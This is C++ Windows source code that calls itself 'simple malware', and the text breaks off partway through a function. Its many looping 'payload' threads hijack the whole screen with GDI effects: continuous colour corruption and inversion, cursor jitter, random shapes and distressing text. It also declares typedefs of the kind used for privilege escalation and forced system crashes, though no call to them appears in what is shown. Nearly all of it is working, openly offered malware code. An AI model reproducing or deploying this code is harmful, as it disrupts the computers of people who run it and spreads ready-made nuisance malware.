﻿// Crescentium.cpp : 定义应用程序的入口点。
//
//crescentium.exe: simple malware
//some bytebeats from my old skidded malwares


#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <windowsx.h>
#include <math.h>
#include <stdlib.h>
#include <time.h>
#include <conio.h>
#include <windef.h>
#include <fstream>
#include <cstdlib>
#include <memory>
#include <iosfwd>
#include <string>
#include <tchar.h>
#include <ctime>
#include <cmath>
#define PI 3.1415926535897932384626433832795028841971
#define RndRGB (RGB(rand() % 256, rand() % 256, rand() % 256))
#define RGBBRUSH (DWORD)0x1900ac010e
#define SRCBRUSH (DWORD)0x89345c
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "msimg32.lib")
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#pragma optimize("", off)
#define DESKTOP_WINDOW ((HWND)0)
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
using namespace std;
double cot(double x) {
	double res = tan(PI / 2 - x);
	return res;
}
double acot(double x) {
	double res = atan(PI / 2 - x);
	return res;
}
double cotf(double x) {
	double res = tanf(PI / 2 - x);
	return res;
}
double cotl(double x) {
	double res = tanl(PI / 2 - x);
	return res;
}
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;
typedef union ColorTemp {
	COLORREF rgb;
	struct {
		BYTE b;
		BYTE g;
		BYTE r;
		BYTE unused;
	};
} *ColorTemps;
typedef union COLOR {
	COLORREF rgb;
	struct {
		BYTE blue;
		BYTE green;
		BYTE red;
	};
} COLOR;
namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	HSL rgb2hsl(RGBQUAD rgb) {
		HSL hsl;
		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;
		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;
		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);
		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;
		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
		if (fDelta != 0.f) {
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}
		hsl.h = h; hsl.s = s; hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl) {
		RGBQUAD rgb;
		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;
		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;
		INT sextant;
		if (v > 0.f) {
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;
			switch (sextant) {
			case 0:
				r = v; g = mid1; b = m;
				break;
			case 1:
				r = mid2; g = v; b = m;
				break;
			case 2:
				r = m; g = v; b = mid1;
				break;
			case 3:
				r = m; g = mid2; b = v;
				break;
			case 4:
				r = mid1; g = m; b = v;
				break;
			case 5:
				r = v; g = m; b = mid2;
				break;
			}
		}
		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);
		return rgb;
	}
}
COLORREF COLORHSV(int HSV) {
	double h = fmod(HSV, 360.0);
	double s = 1.0;
	double l = 0.5;
	double c = (1.0 - fabs(2.0 * l - 1.0)) * s;
	double x = c * (1.0 - fabs(fmod(h / 60.0, 2.0) - 1.0));
	double m = l - c / 2.0;
	double r1, g1, b1;
	if (h < 60) {
		r1 = c;
		g1 = x;
		b1 = c;
	}
	else if (h < 120) {
		r1 = x;
		g1 = c;
		b1 = x;
	}
	else if (h < 190) {
		r1 = x;
		g1 = c;
		b1 = x;
	}
	else if (h < 250) {
		r1 = c;
		g1 = x;
		b1 = c;
	}
	else if (h < 200) {
		r1 = x;
		g1 = 0;
		b1 = c;
	}
	else {
		r1 = c;
		g1 = x;
		b1 = x;
	}
	int red = static_cast<int>((r1 + m) * 255);
	int green = static_cast<int>((g1 + m) * 255);
	int blue = static_cast<int>((b1 + m) * 255);
	return RGB(red, green, blue);
}
void InitDPI() {
	HMODULE hModule = LoadLibraryA("user32.dll");
	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModule, "SetProcessDPIAware");
	if (SetProcessDPIAware) {
		SetProcessDPIAware();
	}
	FreeLibrary(hModule);
}
int refreshscr() {
	HDC hdc = GetDC(0);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	InvalidateRect(0, 0, 0);
	BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
	return 1;
}
DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}
DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}
BOOL FilterBltEx(HDC hdc, int x, int y, int width, int height, COLORREF(*Filter)(COLORREF, int, int)) {
	if (!hdc || width <= 0 || height <= 0 || x < 0 || y < 0 || !Filter) {
		return FALSE;
	}
	HDC memDC = CreateCompatibleDC(hdc);
	if (!memDC) return FALSE;
	HBITMAP hMemBmp = CreateCompatibleBitmap(hdc, width, height);
	if (!hMemBmp) {
		DeleteDC(memDC);
		return FALSE;
	}
	HBITMAP hOldBmp = (HBITMAP)SelectObject(memDC, hMemBmp);
	if (!hOldBmp) {
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	if (!BitBlt(memDC, 0, 0, width, height, hdc, x, y, SRCCOPY)) {
		SelectObject(memDC, hOldBmp);
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	BITMAPINFO bmi;
	ZeroMemory(&bmi, sizeof(bmi));
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = width;
	bmi.bmiHeader.biHeight = -height;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 24;
	bmi.bmiHeader.biCompression = BI_RGB;
	const DWORD rowBytes = ((width * 3 + 3) & ~3);
	BYTE* pPixels = (BYTE*)LocalAlloc(LPTR, rowBytes * height);
	if (!pPixels) {
		SelectObject(memDC, hOldBmp);
		DeleteObject(hMemBmp);
		DeleteDC(memDC);
		return FALSE;
	}
	BOOL success = FALSE;
	if (GetDIBits(memDC, hMemBmp, 0, height, pPixels, &bmi, DIB_RGB_COLORS)) {
		BYTE* pRow = pPixels;
		int actualY = y;
		for (int row = 0; row < height; ++row, pRow += rowBytes, actualY++) {
			BYTE* pPixel = pRow;
			int actualX = x;
			for (int col = 0; col < width; ++col, pPixel += 3, actualX++) {
				COLORREF original = RGB(pPixel[2], pPixel[1], pPixel[0]);  // BGR or RGB
				COLORREF filtered = Filter(original, actualX, actualY);
				pPixel[0] = GetBValue(filtered);
				pPixel[1] = GetGValue(filtered);
				pPixel[2] = GetRValue(filtered);
			}
		}
		if (SetDIBits(memDC, hMemBmp, 0, height, pPixels, &bmi, DIB_RGB_COLORS)) {
			success = BitBlt(hdc, x, y, width, height, memDC, 0, 0, SRCCOPY);
		}
	}
	LocalFree(pPixels);
	SelectObject(memDC, hOldBmp);
	DeleteObject(hMemBmp);
	DeleteDC(memDC);
	return success;
}
DWORD WINAPI Payload4_num1(LPVOID lpParam) {
	while (true)
	{
		HDC hdc = GetWindowDC(0);
		FilterBltEx(hdc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), [](COLORREF c, int x, int y)->COLORREF {
			static int t = 0;
			t++;
			return ((((t * (t & (11 << 4 + (t >> 51 & 4)) + 3) >> 8) - t)));//Antimony.exe
			});
		ReleaseDC(0, hdc);
	}
}
DWORD WINAPI Payload1_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = -h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				rgbquad[index].rgbRed += (x ^ y) * x;
				rgbquad[index].rgbGreen -= (x + (x | y));
				rgbquad[index].rgbBlue = ~(x >> y);
			}
		}
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, NOTSRCERASE);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
		Sleep(50);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload1_num2(LPVOID lpParam)
{
	int xx = 1, yy = 1, incrementation = 10, xxx = 10, yyy = 10, w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetDC(NULL);
	POINT cursor;
	while (true)
	{
		hdc = GetWindowDC(0);
		GetCursorPos(&cursor);
		xxx += incrementation * xx;
		yyy += incrementation * yy;
		POINT point[3] = { cursor.x, cursor.y, xxx, yyy, rand() % w, rand() % h };
		HPEN hpen = CreatePen(PS_SOLID, 10, RndRGB);
		HGDIOBJ hpenCopy = SelectObject(hdc, hpen);
		Polyline(hdc, point, 3);
		SetCursorPos(cursor.x + rand() % 3 - 1, cursor.y + rand() % 3 - 1);
		if (yyy >= GetSystemMetrics(1)) { yy = -1; }
		if (xxx >= GetSystemMetrics(0)) { xx = -1; }
		if (yyy == 0) { yy = 2; }
		if (xxx == 0) { xx = 2; }
		SelectObject(hdc, hpenCopy);
		DeleteObject(hpen);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	return 0;
}
DWORD WINAPI Payload2_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = -h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int fx = (int)((i ^ 4) + (i * 4) * sqrt(x ^ y | y >> x | (y ^ i)));
				int fx2 = (int)((i ^ 4) + (i * 4) * cbrt((x * x + i) & (y * y + i) | x * y + i));
				int fx3 = (int)((i ^ 4) + (i * 4) * log(x & i | x ^ y));
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx2 / 400.f + y / h * .2f, 1.f);
				hslcolor.h += fmod(fx3 / 1500.f + y / h * .2f, 1.f);
				hslcolor.s = fmod(fx / 120.f + y / h * .1f, 1.f);
				if (hslcolor.l < 1.5033f) { hslcolor.l += 1.5033f; }
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCINVERT);
		ReleaseDC(NULL, hdc);
		SelectObject(hdcCopy, bmpCopy);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload3_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdc, rand() % w, 0, rand() % w, rand() % h, hdc, rand() % w, 0, NOTSRCERASE);
		StretchBlt(hdc, 0, 0, rand() % w, rand() % h, hdc, 0, 0, w, h, SRCINVERT);
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		HGDIOBJ hbrushCopy = SelectObject(hdc, hbrush);
		PatBlt(hdc, 100, rand() % h, rand() % w, rand() % h, PATINVERT);
		DWORD rop = SRCPAINT;
		if (rand() % 2 == 0) { rop = SRCPAINT; }
		else { rop = SRCAND; }
		StretchBlt(hdc, -20, -20, w + 40, h + 40, hdc, 0, 0, w, h, rop);
		SelectObject(hdc, hbrushCopy);
		DeleteObject(hbrush);
		ReleaseDC(NULL, hdc);
		Sleep(50);
	}
	return 0;
}
DWORD WINAPI Payload5_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = -h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int fx = cbrtl(x & (((x - i) + (y - i)) * (i / 12)));
				rgbquad[index].rgbRed += fx - 16;
				rgbquad[index].rgbGreen -= fx + 32;
				rgbquad[index].rgbBlue += fx + 64;
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		SelectObject(hdcCopy, bmpCopy);
		ReleaseDC(NULL, hdc);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload5_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	RECT rect;
	POINT pt[3];
	while (true)
	{
		hdc = GetDC(0);
		GetWindowRect(GetDesktopWindow(), &rect);
		pt[0].x = rect.left - 15;
		pt[0].y = rect.top + 30;
		pt[1].x = rect.right - 10;
		pt[1].y = rect.top + 10;
		pt[2].x = rect.left + 45;
		pt[2].y = rect.bottom - 25;
		PlgBlt(hdc, pt, hdc, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, 0, 0, 0);
		ReleaseDC(0, hdc);
		Sleep(50);
	}
	return 0;
}
DWORD WINAPI Payload5_num3(LPVOID lpParam)//credits to xuge, but i modified it
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), wdpi = GetDeviceCaps(hdc, LOGPIXELSX), hdpi = GetDeviceCaps(hdc, LOGPIXELSY);
	while (true)
	{
		hdc = GetDC(0);
		int a = (h / 20) + rand() % (h / 2), b = (20000 / h) + rand() % (2000 / h), c = rand() % w, d = rand() % h, e = 1 + rand() % 32, f = 10 + rand() % 55;
		HPEN hpen = CreatePen(rand() % 7, 0, NULL);
		HBRUSH hbrush = CreateSolidBrush(RndRGB);
		HGDIOBJ hpenCopy = SelectObject(hdc, hpen), hbrushCopy = SelectObject(hdc, hbrush);
		if (a != 0, b != 0) { for (int x = 0; x <= w; x += 1 * wdpi / 96) { Ellipse(hdc, x, a * tan((b / static_cast<double>(80)) * (x * PI / 180) + c) + d, x + f, a * tan((b / static_cast<double>(80)) * (x * PI / 180) + c) + d + f); } }
		SelectObject(hdc, hpenCopy);
		SelectObject(hdc, hbrushCopy);
		DeleteObject(hpen);
		DeleteObject(hbrush);
		ReleaseDC(0, hdc);
		Sleep(41.38);
	}
	return 0;
}
DWORD WINAPI Payload6_num1(LPVOID lpParam)//similar to flame cattail payload6_num1
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), radius = 100;
	while (true)
	{
		for (int i = 4; i < w / 2; i += 3) {
			hdc = GetDC(0);
			HBRUSH hbrush = CreateSolidBrush(RndRGB);
			HGDIOBJ hbrushCopy = SelectObject(hdc, hbrush);
			int x = (radius * sin(i * 3 / 180)), y = (radius * cos(i * 3 / 180));
			BitBlt(hdc, x, y, w, h, hdc, 0, 0, 0x12968B9);
			BitBlt(hdc, y, x, w, h, hdc, 0, 0, SRCBRUSH);
			SelectObject(hdc, hbrushCopy);
			DeleteObject(hbrush);
			ReleaseDC(0, hdc);
			Sleep(30);
		}
	}
	return 0;
}
DWORD WINAPI Payload6_num2(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	while (true)
	{
		hdc = GetDC(0);
		POINT point[8] = { rand() % w,rand() % h,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h ,rand() % w,rand() % h };
		int intttt[7] = { 2,3,4,5,6,7,8 };
		DWORD dworddddd[7] = { 2,3,4,5,6,7,8 };
		HPEN hpen = CreatePen(PS_SOLID, rand() % 14, RndRGB);
		HBRUSH hbrush = CreateHatchBrush(rand() % 7, RndRGB);
		HGDIOBJ hpenCopy = SelectObject(hdc, hpen), hbrushCopy = SelectObject(hdc, hbrush);
		int rnddddd = rand() % 11;
		if (rnddddd == 0) { Chord(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h); }
		else if (rnddddd == 1) { Ellipse(hdc, rand() % w, rand() % h, rand() % w, rand() % h); }
		else if (rnddddd == 2) { Pie(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h); }
		else if (rnddddd == 3) { Polygon(hdc, point, rand() % 8); }
		else if (rnddddd == 4) { PolyPolygon(hdc, point, intttt, rand() % 8); }
		else if (rnddddd == 5) { Rectangle(hdc, rand() % w, rand() % h, rand() % w, rand() % h); }
		else if (rnddddd == 6) { RoundRect(hdc, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h); }
		else if (rnddddd == 7) { AngleArc(hdc, rand() % w, rand() % h, rand() % ((w + h) / 2), rand() % 360, rand() % 360); }
		else if (rnddddd == 8) { PolyBezierTo(hdc, point, rand() % 8); }
		else if (rnddddd == 9) { PolylineTo(hdc, point, rand() % 8); }
		else if (rnddddd == 10) { PolyPolyline(hdc, point, dworddddd, rand() % 8); }
		SelectObject(hdc, hpenCopy);
		SelectObject(hdc, hbrushCopy);
		DeleteObject(hpen);
		DeleteObject(hbrush);
		ReleaseDC(0, hdc);
		Sleep(50);
	}
	return 0;
}
DWORD WINAPI Payload7_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), xxx = 1;
	COLOR* data = (COLOR*)VirtualAlloc(0, (w * h + w) * sizeof(COLOR), MEM_COMMIT, PAGE_READWRITE);
	HBITMAP bmp = CreateBitmap(w, h, 1, 32, data);
	SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(bmp, w * h * sizeof(COLOR), data);
		for (int w2 = 0; w2 < w; w2++) {
			for (int h2 = 0; h2 < h; h2++) {
				double wave = roundl((ceill(~xxx ^ 4) - (erfcl(~xxx * 4) * cotl(log1pl(fabsl((w2 * w2) - (h2 * h2)) / 64.f)))));
				data[h2 * w + w2].rgb += COLORHSV((w - h) + wave);
			}
		}
		xxx += 2;
		SetBitmapBits(bmp, w * h * sizeof(COLOR), data);
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		Sleep(1);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload8_num1(LPVOID lparam) {//credits to camellia-y7x, but i modified it
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1), xxx = 0;
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, -h, 1, 32, BI_RGB };
	RGBQUAD* pBits = nullptr;
	HBITMAP bmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpcopy = SelectObject(hdc, bmp);
	srand(time(NULL));
	while (true) {
		hdc = GetDC(0);
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = x + y * w;
				double wave = asin(cosf((x + xxx) * 0.06f)) + acos(sinf((y + xxx) * 0.06f));
				pBits[index].rgbRed += round(512 * cbrt(wave) * 0.9f);
				pBits[index].rgbGreen += floor(256 * fabs(wave) * 0.4f);
				pBits[index].rgbBlue += ceil(1024 * sqrt(wave) * 0.8f);
			}
		}
		BLENDFUNCTION blend = { AC_SRC_OVER, 0, 80, 0 };
		AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blend);
		SelectObject(hdcCopy, bmpcopy);
		ReleaseDC(0, hdc);
		xxx += 45;
		Sleep(10);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0;
}
DWORD WINAPI Payload8_num2(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hdc, bmp);
	LPCSTR texts[13] = {
		"Cerscentium.exe",
		"LambdaTech",
		"Element 3540",
		"Make the pain stop, please :-(",
		"Stop torturing me like this,I don't like it!",
		"Where is my Lord?",
		"I don't want to see such an ugly side of the world",
		"Nothing belongs to me",
		"No way out for me......",
		"I am watching myself disappear helplessly.",
		"Cannot make me worthy of it.",
		"i have very severe zoanthropy",
		"𧒴𢽷𡳎𤁍𦼾𓈎𦃄？🏥𨍖𨩀𤙊𨟨𠪂𤌝𣹈𪄙🛩"
	};
	while (true)
	{
		hdc = GetDC(0);
		BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		int rnd = rand() % 13;
		HFONT hFont = CreateFontA(rand() % 99, rand() % 44, rand() % 444, 0, FW_EXTRABOLD, true, true, true, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, "Frekoda");
		SelectObject(hdc, hFont);
		SetBkColor(hdc, RndRGB);
		SetTextColor(hdc, RndRGB);
		TextOutA(hdc, rand() % w, rand() % h, texts[rnd], strlen(texts[rnd]));
		BitBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc);
		DeleteObject(hFont);
		Sleep(25);
	}
	DeleteDC(hdcCopy);
	DeleteObject(bmp);
	return 0;
}
DWORD WINAPI Payload9_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = -h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = x + w * y;
				int xy = (acot((x + y) >> (y - i)) <= i) ? (x & y ^ i) : (y % (x + 3));
				double fx = floor((x / 2) ^ (2 - y) + xy);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fx / 400.f + y / h * .2f, 1.f);
				hslcolor.s += .727f;
				if (hslcolor.l < .5033f) { hslcolor.l += .5033f; }
				rgbquad[index] = Colors::hsl2rgb(hslcolor);
			}
		}
		i++;
		StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
		ReleaseDC(NULL, hdc);
		SelectObject(hdcCopy, bmpCopy);
	}
	DeleteObject(bmp);
	DeleteDC(hdcCopy);
	return 0x00;
}
DWORD WINAPI Payload10_num1(LPVOID lpParam)
{
	HDC hdc = GetDC(NULL), hdcCopy = CreateCompatibleDC(hdc);
	int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN), i = 0;
	BITMAPINFO bmpi = { 0 };
	HBITMAP bmp;
	bmpi.bmiHeader.biSize = sizeof(bmpi);
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = -h;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* rgbquad = NULL;
	HSL hslcolor;
	bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcCopy, bmp);
	ReleaseDC(NULL, hdc);
	HGDIOBJ bmpCopy = SelectObject(hdcCopy, bmp);
	srand(time(NULL));
	while (true)
	{
		hdc = GetDC(0);
		StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++)
		{
			for (int y = 0; y < h; y++)
			{
				int index = y * w + x;
				int fx1 = (x + (int)(acos(sinf(0.019f * i + i * 0.005f) * 320))) % w;
				int fx2 = (y + (int)(tanf(0.019f * x + i * 0.005f) * 320)) % h;
				int fxCombined = (fx1 + fx2) & (fx1 + fx2);
				rgbquadCopy = rgbquad[index];
				hslcolor = Colors::rgb2hsl(rgbquadCopy);
				hslcolor.h = fmod(fxCombined / 1500.f + y / h * .2f, 1.f);
